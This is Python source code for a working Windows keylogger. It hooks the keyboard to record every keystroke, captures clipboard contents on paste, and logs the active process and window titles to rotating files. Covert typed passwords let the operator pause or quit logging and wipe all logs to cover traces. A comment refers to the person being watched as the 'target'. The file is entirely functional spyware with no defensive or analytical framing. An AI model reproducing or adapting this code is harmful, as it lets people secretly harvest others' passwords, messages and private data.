from ctypes import *
import pythoncom
import pyHook 
import win32clipboard
import os
import shutil
from time import gmtime, strftime

#Keylogger Vars
user32   = windll.user32
kernel32 = windll.kernel32
psapi    = windll.psapi
current_window = None

#Filewrite Vars
filename_base = "x"
filename_ext  = ".log"
open_type = 'a+'
filesize_limit = 500000 #Bytes
paste_limit = 500 #chars

#CheckQuit Vars
quit_pass = "pyquit"
quit_pass_counter = 0

#CheckKill Vars
kill_pass = "pykill"
kill_pass_counter = 0
kill_program_name = "pylogger.py"

#Checkpass Vars
pause_pass = "pypause"
resume_pass = "pyresume"
resume_pass_counter = 0
pause_pass_counter = 0
pause = False

#Pause Vars
status_pass = "pystatus"
status_pass_counter = 0

#Todo:
#1. DumpSwitch
#2. Encryption
#3. Argument start

#This is triggered every time a key is pressed
#So you can think of this as the main entry point for all other functions
def KeyStroke(event):

    global current_window   

    # check to see if target changed windows
    if event.WindowName != current_window:
        current_window = event.WindowName        
        get_current_process()

    # if they pressed a standard key
    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii),
        checkTriggers(chr(event.Ascii))
        writeToFile(chr(event.Ascii))
    else:
        # if [Ctrl-V], get the value on the clipboard
        # added by Dan Frisch 2014
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            if (len(pasted_value) < paste_limit):
                print "[PASTE] - %s" % (pasted_value),
                writeToFile("[PASTE] - %s" % (pasted_value))
        else:
            print "[%s]" % event.Key,
            writeToFile("[%s]" % event.Key)

    # pass execution to next hook registered 
    return True

#This gets the current process, so that we can display it on the log
def get_current_process():

    # get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()

    # find the process ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # store the current process ID
    process_id = "%d" % pid.value

    # grab the executable
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    # now read it's title
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)

    # print out the header if we're in the right process
    print "\n"
    print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
    print "\n"
  
    #Write
    writeToFile("\n")
    writeToFile("[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))
    writeToFile("\n")

    # close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    
#This checks all the triggers we have to pause, kill, dump, etc.
def checkTriggers(key):
    quitSwitch(key)
    killSwitch(key)
    pauseSwitch(key)
    resumeSwitch(key)
    statusSwitch(key)

#Quit Switch - Turns the keylogger off
def quitSwitch(key):
    global quit_pass_counter

    if (quit_pass[quit_pass_counter] == key):
        quit_pass_counter = quit_pass_counter + 1
        if (quit_pass_counter >= len(quit_pass)):
            quit()
    else:
        quit_pass_counter = 0;

#Kill Switch - Deletes everything including the keylogger itself
def killSwitch(key):
    global kill_pass_counter

    if (kill_pass[kill_pass_counter] == key):
        kill_pass_counter = kill_pass_counter + 1
        if (kill_pass_counter >= len(kill_pass)):

            filelist = [ f for f in os.listdir(".") if f.endswith(".log") ]
            for f in filelist:
                os.remove(f);
            #os.remove(kill_program_name);
            quit()
    else:
        kill_pass_counter = 0;

#Pause Switch - Toggle Logging to file On/Off
def pauseSwitch(key):
    global pause_pass_counter, resume_pass_counter
    global pause

    if (not pause):
        if (pause_pass[pause_pass_counter] == key):
            pause_pass_counter = pause_pass_counter + 1
            if (pause_pass_counter >= len(pause_pass)):
                pause = True;

        else:
            resume_pass_counter = 0;
            pause_pass_counter = 0;

    else:
        if (resume_pass[resume_pass_counter] == key):
            resume_pass_counter = resume_pass_counter + 1
            if (resume_pass_counter >= len(resume_pass)):
                pause = False;

        else:
            resume_pass_counter = 0;
            pause_pass_counter = 0;

#Status Switch - Will beep to let you know its alive
def statusSwitch(key):
    global status_pass_counter

    print"\n\n",status_pass_counter,"\n\n"


    if (status_pass[status_pass_counter] == key):
        status_pass_counter = status_pass_counter + 1
        if (status_pass_counter >= len(status_pass)):
            print "\a";
            status_pass_counter = 0;
    else:
        status_pass_counter = 0;

#Dump everything to a given lettered drive
def dumpSwitch(key):
    i = "TODO"

#Write to File
def writeToFile(key):

    if (pause): return

    global open_type
    filename = filename_base+filename_ext

    try:
        if (os.path.getsize(filename) > filesize_limit):
            xdate = strftime("%Y-%m-%d--%H-%M-%S", gmtime())
            shutil.copy2(filename, filename_base+xdate+filename_ext)
            open_type = 'w+'
            print "New File"
        else:
            open_type = 'a+'
    except:
        open_type = 'a+'

    #print "A",open_type
    target = open(filename,open_type)
    target.write(key)
    target.close();


# create and register a hook manager 
kl         = pyHook.HookManager()
kl.KeyDown = KeyStroke

# register the hook and execute forever
kl.HookKeyboard()
pythoncom.PumpMessages()

